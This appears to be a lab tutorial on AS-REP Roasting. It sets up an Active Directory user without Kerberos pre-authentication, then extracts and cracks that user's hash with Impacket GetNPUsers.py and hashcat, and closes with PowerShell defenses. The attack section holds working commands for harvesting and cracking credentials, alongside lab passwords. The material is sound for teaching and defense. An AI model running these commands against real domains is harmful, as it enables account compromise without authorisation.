# AS-REP Roasting

## Configuring

### Prerequisite&#x20;

{% content-ref url="./" %}
[.](./)
{% endcontent-ref %}

### Configuring

1. Login on `DC02` with the username `Administrator` and password `Welcome01!`.
2. Open the "Active Directory Users and Computers" administration tool on `DC02`.

![](<../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1).png>)

3\. Click on "View" and enable "Advanced Features"

![](<../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png>)

4\. Open "Employees", right click the user `Richard` and click on "Properties"

![](<../../../.gitbook/assets/image (64) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

5\. Open "Account" and scroll to the bottom in "Account options", then select "Do not require kerberos preauthentication".

![](<../../../.gitbook/assets/image (39) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

6\. Right click on `Richard` and select "Reset Password". Uncheck "User must change password at next logon" and fill in the password `Sample123`. Click on "OK"

![](<../../../.gitbook/assets/image (65) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

## Attacking

### How it works

When pre-authentication is not required, an attack can directly send a request for authentication. The KDC will return an encrypted TGT and the attacker can extract the hash and brute-force it offline.

### Tools

* [Impacket GetNPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py)

### Executing the attack

1. Make sure Impacket is installed and run the GetNPUsers.py tool with the users we enumerated earlier and saved in `users.txt`. The tool will check if any of the enumerated users doesn't require pre-authentication and will request a ticket which we can crack offline.

```
GetNPUsers.py amsterdam/ -dc-ip 10.0.0.3 -usersfile users.txt -format hashcat -outputfile asreproasting
```

![](<../../../.gitbook/assets/image (7) (1) (1) (1) (1).png>)

2\. The tool doesn't say anything about users that don't require pre-authentication. Check if the outputfile exists and cat it:

```
cat asreproasting
```

![](<../../../.gitbook/assets/image (43) (1) (1) (1) (1) (1).png>)

3\. The user `Richard` doesn't require pre-authentication and we have an hash from the TGT. Lets crack it with Hashcat and [this](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/2020-200\_most\_used\_passwords.txt) wordlist. The Hashcat parameters are:

* Crackingmode: `-a 0` for using a wordlist
* Hashmode: `-m 18200` for Kerberos 5, etype 23, AS-REP
* List with hashes: `asreproasting`
* Password list: `2020-200_most_used_passwords.txt`

```
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/2020-200_most_used_passwords.txt
hashcat -a 0 -m 18200 asreproasting 2020-200_most_used_passwords.txt
```

![](<../../../.gitbook/assets/image (10) (1) (2) (1) (1).png>)

4\. We successfully cracked the password. The password for `Richard` is `Sample123`.

## Defending

### Recommendations

* Periodically check for users that don't require pre-authentication and remove the attribute.

Check for users with the attribute:

```
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} | Select-Object samAccountName
```

Remove the attribute for a single user:

```
Set-ADAccountControl -DoesNotRequirePreAuth $false -Identity <USER>
```

Check for users with the attribute and remove it:

```
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} | Set-ADAccountControl -DoesNotRequirePreAuth $false
```

### Detection



## References

{% embed url="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py" %}
